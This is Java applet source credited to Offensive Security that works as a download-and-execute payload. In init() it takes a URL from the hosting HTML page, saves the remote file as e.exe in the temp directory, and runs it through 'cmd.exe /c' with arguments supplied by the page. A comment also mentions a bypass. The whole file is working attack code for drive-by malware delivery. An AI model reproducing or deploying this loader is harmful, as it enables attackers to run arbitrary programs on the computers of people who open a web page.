import java.applet.*;
import java.awt.*;
import java.io.*;
import java.net.URL;
import java.util.*;
import javax.swing.JOptionPane;
/**
* Author: Offensive Security
* MOD: Chase Hatch
* This Java applet will download a file and execute it using CMD.exe.
* Takes two parameters, defined in the HTML page itself:
* **The URL of the file to download
* **Parameters to pass to the file when executed by CMD.exe
* Third parameter, pass "DEBUG" to display popup debug info, anything else to suppress
**/


public class Java extends Applet {
    private Object initialized = null; 
    public Object isInitialized()
    {
        return initialized;
    }
    
    public void show(String message) {
        JOptionPane.showMessageDialog(null, message, "DEBUG", JOptionPane.WARNING_MESSAGE);
    }
    public void init() {
        Process f;
    try {
    String tmpdir = System.getProperty("java.io.tmpdir") + File.separator;
    String expath = tmpdir + "e.exe";
    String download = "";
    download = getParameter("1");
    String argues = "";
    argues = getParameter("2");
    String runtime = "";
    String dbg = "";
    dbg = getParameter("3");
    if (dbg.equals("DEBUG")){
	show(download);
        show(argues);
    }
    if (download.length() > 0) {
        // URL parameter
        URL url = new URL(download);
        // Get an input stream for reading
        InputStream in = url.openStream();
        // Create a buffered input stream for efficency
        BufferedInputStream bufIn = new BufferedInputStream(in);
        File outputFile = new File(expath);
        OutputStream out = new BufferedOutputStream(new FileOutputStream(outputFile));
        byte[] buffer = new byte[2048];
        for (;;) {
            int nBytes = bufIn.read(buffer);
            if (nBytes <= 0) break;
                out.write(buffer, 0, nBytes);
            }
            out.flush();
            out.close();
            in.close();
            runtime = "cmd.exe /c " + expath + " " + argues;
	    if (dbg.equals("DEBUG")){
                show(runtime);
            }
            f = Runtime.getRuntime().exec(runtime);
        }
    } catch(IOException e) {
        e.printStackTrace();
    }
    /* ended here and commented out below for bypass */
    catch (Exception exception)
    {
        exception.printStackTrace();
    }
}
}

